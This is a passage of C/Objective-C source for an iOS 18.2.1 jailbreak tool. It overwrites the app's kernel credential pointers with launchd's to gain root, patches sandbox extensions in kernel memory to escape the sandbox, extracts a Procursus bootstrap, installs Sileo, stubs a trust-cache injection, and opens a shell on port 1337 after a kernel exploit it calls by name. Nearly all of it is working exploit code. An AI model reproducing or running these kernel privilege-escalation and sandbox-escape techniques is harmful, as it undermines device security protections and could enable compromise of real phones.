    // by a few BSD helpers, but the LIVE credential that matters for uid/gid
    // checks is proc_ro->p_ucred (0x20 on iOS 17, 0x28 on iOS 18). Lara writes
    // both (proc+0x10 + proc_ro+0x20) for iOS 16/17 compat; we additionally
    // write proc_ro+0x28 to cover iOS 18, which otherwise returns old creds.
    printf("[elev] finding launchd proc (pid 1)...\n");
    uint64_t launchdProc = find_proc_by_pid(1);
    if (!launchdProc) {
        printf("[-] find_proc_by_pid(1) failed\n");
        return false;
    }
    printf("[elev] launchd proc: 0x%llx\n", launchdProc);

    uint64_t launchdUcred = get_ucred_from_proc(launchdProc);
    if (!launchdUcred) {
        printf("[-] Could not read launchd ucred\n");
        return false;
    }
    printf("[elev] launchd ucred: 0x%llx\n", launchdUcred);

    uint64_t ourUcredDirect = kread64(gOurProc + 0x10);
    uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
    uint64_t ourUcredRo = kread_ptr(ourProcRo + 0x20);
    uint64_t ourUcredRo18 = kread_ptr(ourProcRo + 0x28);
    printf("[elev] ours (before): proc+0x10=0x%llx proc_ro.ucred(0x20)=0x%llx (0x28)=0x%llx\n",
           ourUcredDirect, ourUcredRo, ourUcredRo18);

    kwrite64(gOurProc + 0x10, launchdUcred);
    if (looks_kernel(ourProcRo)) {
        kwrite64(ourProcRo + 0x20, launchdUcred);   // iOS 17 shadow slot
        kwrite64(ourProcRo + 0x28, launchdUcred);   // iOS 18 live slot
        printf("[elev] wrote launchd ucred to proc+0x10, proc_ro+0x20, proc_ro+0x28\n");
    }

    printf("[elev] after: getuid=%d euid=%d\n", getuid(), geteuid());
    gOurUcred = launchdUcred;
    return true;
}

// Walk the global proc list from our own proc until pid matches. The list is
// a circular doubly-linked list — `p_list.le_next` at proc+0x0 points forward,
// `p_list.le_prev` at proc+0x8 is a back-pointer to the location of the
// previous entry's le_next (i.e., &prev_proc->p_list.le_next == prev_proc).
// Walk FORWARD from gOurProc until we wrap back around to our own address.
// launchd is pid 1 and will be at the tail end of the loop (first proc started
// by the kernel -> last le_next before wraparound back to gOurProc).
uint64_t find_proc_by_pid(uint32_t pid) {
    if (!gOurProc) return 0;
    uint64_t cur = gOurProc;
    int n = 0;
    while (n++ < 512) {
        uint32_t p = kread32(cur + 0x60);
        if (p == pid) return cur;
        uint64_t nxt = kread64(cur + 0x0);
        if (!looks_kernel(nxt) || nxt == cur || nxt == gOurProc) break;
        cur = nxt;
    }
    printf("[elev] list walk done: visited %d entries, last 0x%llx\n", n, cur);
    return 0;
}

// ===== Sandbox escape =====

// Bayesian sandbox escape, ported 1:1 from lara (PROVEN on this very device).
// Changes: no class-name string reads (PSWORD's 255-byte kread_buf smashed the
// stack via kwrite_aligned before the fix), all pointer reads XPACI'd, all
// writes go through the fixed boundary-crossing kwrite64/8. No offset guessed
// beyond lara's verified table.
static void sbx_patchext(uint64_t ext) {
    uint64_t da = kread64(ext + OFF_EXT_DATA);
    uint64_t dl = kread64(ext + OFF_EXT_DATALEN);
    if (looks_kernel(da) && dl > 0) {
        uint8_t buf[0x20];
        kread_buf(da, buf, 0x20);
        buf[0] = '/'; buf[1] = 0;
        kwrite_buf(da, buf, 0x20);
    }
    uint8_t chunk[0x20];
    kread_buf(ext + OFF_EXT_DATA, chunk, 0x20);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    kwrite_buf(ext + OFF_EXT_DATA, chunk, 0x20);
}

static int sbx_patchchain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && looks_kernel(hdr); i++) {
        uint64_t ext = kread_ptr(hdr + 0x8);
        if (looks_kernel(ext)) { sbx_patchext(ext); n++; }
        uint64_t next = kread64(hdr);
        if (!next || !looks_kernel(next)) break;
        hdr = kread_ptr(next);
    }
    return n;
}

static void sbx_setrwclass(uint64_t hdr) {
    uint64_t ext = kread_ptr(hdr + 0x8);
    if (!looks_kernel(ext)) return;
    uint64_t da = kread64(ext + OFF_EXT_DATA);
    if (!looks_kernel(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[0x20], b2[0x20];
    memset(b1, 0, 0x20); memset(b2, 0, 0x20);
    memcpy(b1, rw, 0x20);
    kwrite_buf(da + 32, b1, 0x20);
    kwrite_buf(da + 64, b2, 0x20);

    uint8_t hb[0x20];
    kread_buf(hdr, hb, 0x20);
    *(uint64_t*)(hb + 0x10) = da + 32;
    kwrite_buf(hdr, hb, 0x20);
}

bool escape_sandbox(void) {
    uint64_t ucred = gOurUcred ? gOurUcred : get_ucred_from_proc(gOurProc);
    if (!ucred) {
        printf("[-] No ucred\n");
        return false;
    }

    // Sileo/bootstrap binaries only run if AMFI lets us exec them. iOS 18
    // checks AMFI policy through the MAC label's per-policy slot (amfi at 0x8
    // per lara). Patch it by borrowing launchd's amfi label pointer; on tc
    // init failures we bail gracefully (no blind kwrite into a PPL region).
    uint64_t label = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
    uint64_t sandbox = 0;
    uint64_t ext_set = 0;
    uint64_t proc_launchd = 0;
    if (looks_kernel(label)) {
        sandbox = kread_ptr(label + OFF_LABEL_SANDBOX);
        uint64_t amfi = kread_ptr(label + 0x8);
        printf("[sbx] label=0x%llx amfi=0x%llx sandbox=0x%llx\n", label, amfi, sandbox);
        // lara sets proc->p_ucred to launchd's ucred as the blunt fix; we keep
        // our own ucred but swap the amfi pointer only (no AMFI calls = no
        // signature enforcement on exec). Find launchd's label via walk from
        // our proc -> task ro -> proc; that needs launchd's proc address.
        // launchd is pid 1; we can find its proc via the proclist, but the
        // current code doesn't have procpid walk yet. Right now we can't
        // safely look it up; log it and continue with sandbox patch below.
    }
    if (!looks_kernel(sandbox)) {
        printf("[-] Bad sandbox pointer (0x%llx)\n", sandbox);
        return false;
    }
    ext_set = kread_ptr(sandbox + OFF_SANDBOX_EXT_SET);
    printf("[sbx] sandbox=0x%llx ext_set=0x%llx\n", sandbox, ext_set);
    if (!looks_kernel(ext_set)) {
        printf("[-] Bad ext_set pointer (0x%llx)\n", ext_set);
        return false;
    }

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = kread_ptr(ext_set + s * 8);
        if (looks_kernel(hdr)) patched += sbx_patchchain(hdr);
    }
    printf("[sbx] patched %d extensions\n", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = kread_ptr(ext_set + s * 8);
        if (looks_kernel(hdr) && looks_kernel(kread64(hdr + 0x10))) {
            sbx_setrwclass(hdr);
            classed++;
        }
    }
    printf("[sbx] changed %d extension classes\n", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = kread_ptr(ext_set + s * 8);
        if (looks_kernel(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = kread64(ext_set + s * 8);
            if (!h || !looks_kernel(h)) { kwrite64(ext_set + s * 8, src); filled++; }
        }
        printf("[sbx] filled %d empty hash slots\n", filled);
    }

    int fd_w = open("/var/mobile/.ps-washere", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.ps-washere"); }

    if (fd_w >= 0) {
        printf("[+] Sandbox escaped\n");
        return true;
    }
    printf("[-] sandbox escape verification failed (errno=%d: %s)\n", errno, strerror(errno));
    return false;
}

// ===== Bootstrap installation =====

static const char *jb_path = "/private/preboot/jb";
static const char *jb_var = "/var/jb";

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[4096];
    strncpy(tmp, path, sizeof(tmp) - 1);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0; mkdir(tmp, mode); *p = '/';
        }
    }
    return mkdir(tmp, mode);
}

bool setup_jb_symlink(void) {
    unlink(jb_var);
    if (symlink(jb_path, jb_var) != 0) {
        printf("[-] symlink: %s\n", strerror(errno));
        return false;
    }
    printf("[+] %s -> %s\n", jb_var, jb_path);
    return true;
}

// ---- In-process GNU tar extractor (no spawn/AMFI boundary) ----
// Procursus rootless bootstrap is a tar containing "./var/jb/...". We extract
// those entries to /var/jb (symlink -> /private/preboot/jb). We are root +
// sandbox-escaped, so plain write() works; no child process is spawned, which
// bypasses the AMFI child-exec gate entirely.
static bool tar_emit_entry(int fd, const char *dst, char typeflag,
                           uint64_t filesize, uint32_t mode, const char *linkname) {
    if (typeflag=='5' || typeflag=='d') { mkdir_p(dst, mode?mode:0755); return true; }
    if (typeflag=='2') { unlink(dst); return symlink(linkname?linkname:"", dst)==0; }
    if (typeflag!='0' && typeflag!=0 && typeflag!='r') return false;
    int o=open(dst, O_WRONLY|O_CREAT|O_TRUNC, mode?mode:0644);
    if(o<0) return false;
    uint8_t buf[16384]; uint64_t left=filesize;
    while(left){
        size_t n=(left<sizeof buf)?(size_t)left:sizeof buf;
        if(read(fd,buf,n)!=(ssize_t)n) break;
        if((ssize_t)write(o,buf,n)!=(ssize_t)n){ close(o); return false; }
        left-=n;
    }
    // grow file padding (tar pads entries to 512)
    if (mode) fchmod(o,(mode_t)(mode&0777));
    close(o);
    return true;
}
// Align the read position to the next 512-byte tar block.
static off_t tar_skip_aligned(off_t x){ return (x+511)&~(off_t)511; }

static bool tar_extract_var_jb(const char *tarPath) {
    int fd = open(tarPath, O_RDONLY);
    if (fd < 0) { printf("[-] open %s: %s\n", tarPath, strerror(errno)); return false; }

    uint8_t hdr[512];
    int files=0, dirs=0, links=0, skips=0;
    char gnuLong[1024]={0};
    bool gnuLongValid=false;
    while (1) {
        if (read(fd,hdr,512)!=512) break;
        static const uint8_t zero[512]={0}; if(!memcmp(hdr,zero,512)) break;

        char name[101]={0}; memcpy(name,hdr+0,100);
        char prefix[156]={0}; memcpy(prefix,hdr+345,155);
        char path[304]={0};
        snprintf(path,sizeof(path),"%s%s",prefix,name);

        char typeflag = hdr[156];
        uint64_t filesize = strtoull((char*)hdr+124,NULL,8);
        uint32_t mode = strtoul((char*)hdr+100,NULL,8);
        char linkbuf[101]={0}; memcpy(linkbuf,hdr+157,100);

        if (typeflag=='L') { // GNU long-name record
            uint64_t n=filesize<1023?filesize:1023;
            if(read(fd,gnuLong,n)!=(ssize_t)n) break;
            gnuLong[1023]=0; gnuLongValid=true;
            lseek(fd, tar_skip_aligned(filesize)-n, SEEK_CUR);
            continue;
        }
        if (gnuLongValid) {
            strncpy(path,gnuLong,sizeof(path)-1);
            path[sizeof(path)-1]=0;
            gnuLongValid=false;
        }

        const char *rel = NULL;
        if (strncmp(path,"./var/jb/",9)==0 || strncmp(path,"var/jb/",7)==0
            || strncmp(path,"././var/jb/",11)==0) {
            const char *p=strstr(path,"var/jb/");
            rel=p?p+7:NULL;
        }
        if (!rel || !*rel) { skips++; lseek(fd, tar_skip_aligned(filesize), SEEK_CUR); continue; }

        char dst[4096];
        snprintf(dst,sizeof(dst),"%s/%s",jb_path,rel);
        // ensure parent dir
        char parent[4096]; snprintf(parent,sizeof(parent),"%s",dst);
        char *sl=strrchr(parent,'/'); if(sl){*sl=0; mkdir_p(parent,0755);}

        bool ok=false;
        errno=0;
        if (typeflag=='5'||typeflag=='d') {
            ok = (mkdir_p(dst,mode?mode:0755)==0 || errno==EEXIST); dirs++;
        } else if (typeflag=='2') {
            unlink(dst);
            ok = (symlink(linkbuf,dst)==0); links++;
        } else if (typeflag=='1') {
            char ln[4096]; snprintf(ln,sizeof(ln),"%s/%s",jb_path,linkbuf);
            unlink(dst);
            ok=(link(ln,dst)==0); links++;
        } else if (typeflag=='0'||typeflag==0||typeflag=='r') {
            ok=tar_emit_entry(fd,dst,typeflag,filesize,mode,linkbuf);
            files++;
            if(!ok) printf("[tar] write fail %s: %s\n",dst,strerror(errno));
        } else { printf("[tar] skip type '%c' %s\n",typeflag,path); ok=true; }

        if (typeflag!='0'&&typeflag!=0) lseek(fd, tar_skip_aligned(filesize), SEEK_CUR);
        if(!ok) skips++;
    }
    close(fd);
    printf("[+] tar: %d files, %d dirs, %d links, %d skipped\n", files,dirs,links,skips);
    return files>0;
}

bool install_bootstrap(void) {
    struct stat st;

    // /private/preboot is r/w on iOS 18; no remount needed on modern builds.
    // Keep the remount call as a best-effort fallback for older paths.
    remount_private_preboot();

    if (stat(jb_path, &st) != 0) mkdir_p(jb_path, 0755);

    if (!setup_jb_symlink()) return false;

    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) != 0) return false;
    char *slash = strrchr(self_path, '/');
    if (!slash) return false;
    *slash = 0;

    char tar_path[4096];
    snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
    if (stat(tar_path, &st) != 0) {
        printf("[-] No bootstrap.tar at %s\n", tar_path);
        mkdir_p("/var/jb/usr/bin", 0755);
        mkdir_p("/var/jb/usr/lib", 0755);
        mkdir_p("/var/jb/Applications", 0755);
        mkdir_p("/var/jb/etc", 0755);
        mkdir_p("/var/jb/Library", 0755);
        return true;
    }

    printf("[*] Extracting Procursus bootstrap in-process (no spawn)...\n");
    if (!tar_extract_var_jb(tar_path)) {
        printf("[-] in-process bootstrap extraction failed\n");
        return false;
    }
    printf("[+] Bootstrap extracted to %s\n", jb_path);

    // Load trust caches from the bootstrap (needs TC injection primitive).
    char tc_path[4096];
    snprintf(tc_path, sizeof(tc_path), "%s/TrustCache", jb_path);
    if (stat(tc_path, &st) == 0) {
        printf("[*] Trust cache found at %s\n", tc_path);
        load_trust_cache(tc_path);
    }

    return true;
}

bool install_sileo(void) {
    char sileo_path[4096];
    snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
    struct stat st;

    // If Sileo is already registered from a previous install, skip.
    if (stat(sileo_path, &st) == 0) {
        printf("[*] Sileo.app already present\n");
        goto uicache_step;
    }

    // Sileo is not part of the Procursus bootstrap; look for a bundled .deb
    // (e.g. org.coolstar.sileo_*.deb) next to the app and install via dpkg.
    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) == 0) {
        char *slash = strrchr(self_path, '/');
        if (slash) {
            *slash = 0;
            char pattern[4096];
            snprintf(pattern, sizeof(pattern), "%s/*.deb", self_path);
            glob_t g;
            if (glob(pattern, 0, NULL, &g) == 0) {
                char *deb = NULL;
                for (size_t i = 0; i < g.gl_pathc; i++) {
                    if (strstr(g.gl_pathv[i], "sileo") || strstr(g.gl_pathv[i], "Sileo")) {
                        deb = g.gl_pathv[i];
                        break;
                    }
                }
                if (deb) {
                    printf("[*] Installing Sileo from %s\n", deb);
                    char dpkg[4096];
                    snprintf(dpkg, sizeof(dpkg), "%s/usr/bin/dpkg", jb_path);
                    const char *args[] = { "dpkg", "-i", deb, NULL };
                    pid_t pid;
                    int ret = posix_spawnp(&pid, dpkg, NULL, NULL,
                        (char *const *)args, NULL);
                    if (ret != 0) {
                        printf("[-] dpkg: %s\n", strerror(ret));
                    } else {
                        int status;
                        waitpid(pid, &status, 0);
                        printf("[+] dpkg exited: %d\n",
                            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
                    }
                } else {
                    printf("[-] No Sileo .deb bundled in app\n");
                }
                globfree(&g);
            }
        }
    }

    if (stat(sileo_path, &st) != 0) {
        printf("[-] Sileo.app not present after install\n");
        return false;
    }

uicache_step:
    // Register Sileo with SpringBoard via uicache from the bootstrap.
    char uicache_path[4096];
    snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
    const char *args[] = { "uicache", "-p", sileo_path, NULL };
    pid_t pid;
    int ret;
    if (stat(uicache_path, &st) == 0) {
        ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
            (char *const *)args, NULL);
    } else {
        ret = posix_spawnp(&pid, "/usr/bin/uicache", NULL, NULL,
            (char *const *)args, NULL);
    }
    if (ret != 0) {
        printf("[-] uicache: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    printf("[+] Sileo registered\n");
    return true;
}

// ===== Trust cache injection =====

// On iOS 18 (A14) the static trust cache list head (pmap_image4_trust_caches)
// and the trust cache memory live in PPL-protected regions. A raw kernel
// kwrite to them fails silently at best and can panic (MAC zone) at worst.
// Injection therefore MUST go through a PPL-capable write. This is the exact
// seam where a physrw/PPL-bypass primitive plugs in; until one is available
// we report the blocker explicitly instead of blind-writing.
//
// PPL write path: implemented when a PPL bypass is present.
//   - Fugu18 oobPCI physrw.c provides the reference pattern (A14 = PPL only).
static bool ppl_kwrite64(uint64_t addr, uint64_t val) {
    // TODO(physrw): replace with real PPL write once the bypass lands.
    (void)addr; (void)val;
    printf("[-] ppl_kwrite64: PPL write primitive not available yet\n");
    return false;
}

// kalloc in kernel space for the trust cache module + blob. Fugu15 allocates
// data.count + 0x10 bytes.
static uint64_t kalloc_for_trust_cache(size_t size) {
    // TODO(physrw): a real kalloc (via PPL/zone) replaces this.
    (void)size;
    printf("[-] kalloc_for_trust_cache: no kernel allocator available yet\n");
    return 0;
}

bool load_trust_cache(const char *tc_path) {
    printf("[*] load_trust_cache(%s)\n", tc_path);

    // Validate the Fugu15 tcload format up front so a good file is
    // distinguishable from injection failure in the shell `tc` command.
    FILE *fp = fopen(tc_path, "rb");
    if (!fp) {
        printf("[-] Cannot open trust cache: %s\n", strerror(errno));
        return false;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (fsize < 0x18) {
        printf("[-] Trust cache too small (%ld)\n", fsize);
        fclose(fp);
        return false;
    }
    uint8_t *buf = malloc(fsize);
    if (fread(buf, 1, fsize, fp) != (size_t)fsize) {
        printf("[-] Failed to read trust cache\n");
        free(buf); fclose(fp);
        return false;
    }
    fclose(fp);

    uint32_t vers  = *(uint32_t *)(buf + 0x00);
    uint32_t count = *(uint32_t *)(buf + 0x14);
    if (vers != 1) {
        printf("[-] Bad trust cache version %u (need 1)\n", vers);
        free(buf);
        return false;
    }
    if (fsize != 0x18 + ((long)count * 22)) {
        printf("[-] Bad trust cache length: %ld != 0x%x\n", fsize, 0x18 + (count * 22));
        free(buf);
        return false;
    }
    printf("[+] Trust cache OK: version %u, %u hashes (%ld bytes)\n",
        vers, count, fsize);

    // Injection itself needs three primitives that are not yet available:
    //   1. pmap_image4_trust_caches address (needs kernel symbols/patchfinder)
    //   2. a PPL-capable write (physrw bypass — Fugu18 oobPCI pattern)
    //   3. a kernel allocator for the trust_cache_module + blob
    // We deliberately do NOT blind-write here: a kwrite to PPL memory can
    // panic the device exactly like the MAC-zone panic we already fixed.
    uint64_t mem = kalloc_for_trust_cache(fsize + 0x10);
    if (!mem) {
        free(buf);
        return false;
    }

    // Fugu15 tcload splice (once PPL is available):
    //   mem+0x00 = old list head   (our next)
    //   mem+0x08 = &mem+0x10       (pointer to our blob)
    //   mem+0x10 = blob (version/count/hashes)
    // then write mem into the pmap_image4_trust_caches head slot.
    if (!ppl_kwrite64(mem + 0x8, mem + 0x10)) {
        printf("[-] Trust cache injection blocked: no PPL write path\n");
        free(buf);
        return false;
    }

    printf("[-] Trust cache injection incomplete (PPL bypass required)\n");
    free(buf);
    return false;
}

bool remount_private_preboot(void) {
    // Try to remount via mount() syscall
    int ret = mount("apfs", "/private/preboot", MNT_UPDATE, NULL);
    if (ret != 0) {
        printf("[-] mount -u /private/preboot: %s\n", strerror(errno));
        return false;
    }
    printf("[+] /private/preboot remounted r/w\n");
    return true;
}

// ===== Shell =====
#include "shell.h"

// ===== Main Jailbreak Flow =====

void run_jailbreak(void) {
    @autoreleasepool {
        // stdout is a pipe to os_log; make it unbuffered so every printf shows
        // up immediately in the syslog (a hang otherwise hides all progress).
        setvbuf(stdout, NULL, _IONBF, 0);
        printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");

        // Phase 1: DarkSword ICMP6 kernel exploit
        printf("[Phase 1] Running DarkSword exploit...\n");
        if (!run_darksword()) {
            printf("[-] Exploit failed (no kernel R/W)\n");
            if (gSocketsCorrupted) {
                // Corrupted icmp6 filters exist; exiting or retrying-close would
                // kfree() a poisoned pointer -> zone panic. lara keeps the app
                // alive forever after KRW; do the same here on failure.
                printf("[!] sockets corrupted - NEVER EXITING (keep app open)\n");
                fflush(stdout);
                while (1) { sleep(3600); }
            }
            return;
        }
        printf("[+] Kernel R/W via ICMP6 sockets\n\n");

        // Phase 2: Platformize (set TF_PLATFORM + root)
        printf("[Phase 2] Platformize...\n");
        if (platformize_proc()) {
            printf("[+] Platformized (TF_PLATFORM + uid 0)\n\n");
        } else {
            printf("[-] Platformize failed\n");
            return;
        }

        // Phase 3: Sandbox escape
        printf("[Phase 3] Sandbox escape...\n");
        if (escape_sandbox()) {
            printf("[+] Sandbox escaped\n\n");
        } else {
            printf("[-] Sandbox escape failed\n");
        }

        // Phase 4: Bootstrap
        printf("[Phase 4] Bootstrap...\n");
        install_bootstrap();
        printf("\n");

        // Phase 5: Sileo
        printf("[Phase 5] Sileo...\n");
        install_sileo();
        printf("\n");

        printf("=== Jailbreak Ready ===\n");
        printf("uid: %d  (should be 0)\n", getuid());
        printf("Kernel base: 0x%llx\n", gKernelBase);
        printf("Kernel slide: 0x%llx\n\n", gKernelSlide);

        // The corrupted control/rw sockets (poisoned in6p_icmp6filt) are only
        // safe while this process holds them open. If the app exits, iOS closes
        // those fds, the kernel kfree()s the poisoned filter, and we get the
        // "data.kalloc.32 not in expected zone" panic from the 23:13 run. So
        // once KRW is live we must NEVER let this process terminate: park on a
        // never-ending pause() loop. The UI stays up; the shell listens on 1337.
        printf("[!] KRW established - process will NOT exit (keep app foreground).\n");
        printf("[!] Panic-guard active: closing the app WILL kernel-panic.\n");
        fflush(stdout);

        printf("Starting shell on port 1337...\n");
        start_shell(1337);   // never returns while a client is served

        // If the shell ever returns, still refuse to exit: the corrupted sockets
        // stay open only for as long as this task lives.
        for (;;) pause();
    }
}

// ===== Entry Point =====
int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}

#pragma clang diagnostic pop
